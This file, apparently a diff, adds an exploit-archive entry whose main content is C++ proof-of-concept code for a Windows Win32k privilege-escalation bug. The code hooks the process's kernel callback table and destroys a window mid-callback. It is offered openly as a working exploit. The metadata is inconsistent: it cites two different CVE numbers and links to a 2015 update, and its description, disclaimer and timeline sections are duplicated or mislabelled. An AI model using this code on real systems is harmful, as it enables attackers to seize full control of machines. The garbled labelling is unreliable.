@@ -1,0 +1,113 @@
+# Exploit Title: Microsoft Windows - Win32k Elevation of Privilege
+# Author: nu11secur1ty
+# Date: 08.03.2020
+# Exploit Date: 01/14/2020
+# Vendor: Microsoft
+# Software Link: https://support.microsoft.com/en-us/help/3095649/win32k-sys-update-in-windows-october-2015
+# Exploit link: https://github.com/nu11secur1ty/Windows10Exploits/raw/master/Undefined/CVE-2020-0624/win32k/__32-win32k.sys5.1.2600.1330.zip
+# CVE: CVE-2020-0642
+
+[+] Credits: Ventsislav Varbanovski (nu11secur1ty)
+[+] Source:  readme from GitHUB
+
+[Exploit Program Code]
+
+// cve-2020-0624.cpp
+
+#pragma warning(disable: 4005)
+#pragma warning(disable: 4054)
+#pragma warning(disable: 4152)
+#pragma warning(disable: 4201)
+
+#include <Windows.h>
+#include "ntos.h"
+
+typedef NTSTATUS(NTAPI* PFNUSER32CALLBACK)(PVOID);
+
+HWND hParent{}, hChild{};
+BOOL Flag1{}, Flag2{};
+
+PFNUSER32CALLBACK OrgCCI2{}, OrgCCI3{};
+
+NTSTATUS NTAPI NewCCI2(PVOID Param)
+{
+	if (Flag1)
+	{
+		Flag1 = FALSE;
+		Flag2 = TRUE;
+		DestroyWindow(hParent);
+	}
+	return OrgCCI2(Param);
+}
+NTSTATUS NTAPI NewCCI3(PVOID Param)
+{
+	if (Flag2)
+	{
+		ExitThread(0);
+	}
+	return OrgCCI3(Param);
+}
+int main()
+{
+	DWORD OldProtect{};
+
+	PTEB teb = NtCurrentTeb();
+	PPEB peb = teb->ProcessEnvironmentBlock;
+	PVOID pCCI2 = &((PVOID*)peb->KernelCallbackTable)[2];
+	if (!VirtualProtect(pCCI2, sizeof(PVOID), PAGE_EXECUTE_READWRITE, &OldProtect))
+		return 0;
+	OrgCCI2 = (PFNUSER32CALLBACK)InterlockedExchangePointer((PVOID*)pCCI2,
+&NewCCI2);
+
+	PVOID pCCI3 = &((PVOID*)peb->KernelCallbackTable)[3];
+	if (!VirtualProtect(pCCI3, sizeof(PVOID), PAGE_EXECUTE_READWRITE, &OldProtect))
+		return 0;
+	OrgCCI3 = (PFNUSER32CALLBACK)InterlockedExchangePointer((PVOID*)pCCI3,
+&NewCCI3);
+
+	hParent = CreateWindow(L"ScrollBar", L"Parent", WS_OVERLAPPEDWINDOW,
+CW_USEDEFAULT, CW_USEDEFAULT, 10, 10, NULL, NULL, NULL, NULL);
+	hChild = CreateWindow(L"ScrollBar", L"Child", WS_OVERLAPPEDWINDOW |
+WS_VISIBLE, CW_USEDEFAULT, CW_USEDEFAULT, 10, 10, NULL, 0, NULL,
+NULL);
+	Flag1 = TRUE;
+	SendMessage(hChild, WM_LBUTTONDOWN, 0, 0);
+	return 0;
+}
+
+
+[Vendor]
+Microsoft
+
+
+[Vulnerability Type]
+Privilege Escalation
+
+
+[Description]
+The entry creation date may reflect when the CVE ID was allocated or
+reserved, and does not necessarily indicate when this vulnerability
+was discovered, shared with the affected vendor, publicly disclosed,
+or updated in CVE.
+- - - more: https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-0642
+
+[Disclosure Timeline]
+An elevation of privilege vulnerability exists in Windows when the
+Win32k component fails to properly handle objects in memory. An
+attacker who successfully exploited this vulnerability could run
+arbitrary code in kernel mode. An attacker could then install
+programs; view, change, or delete data; or create new accounts with
+full user rights.
+To exploit this vulnerability, an attacker would first have to log on
+to the system. An attacker could then run a specially crafted
+application that could exploit the vulnerability and take control of
+an affected system.
+The update addresses this vulnerability by correcting how Win32k
+handles objects in memory.
+
+
+[+] Disclaimer
+The entry creation date may reflect when the CVE ID was allocated or
+reserved, and does not necessarily indicate when this vulnerability
+was discovered, shared with the affected vendor, publicly disclosed,
+or updated in CVE.
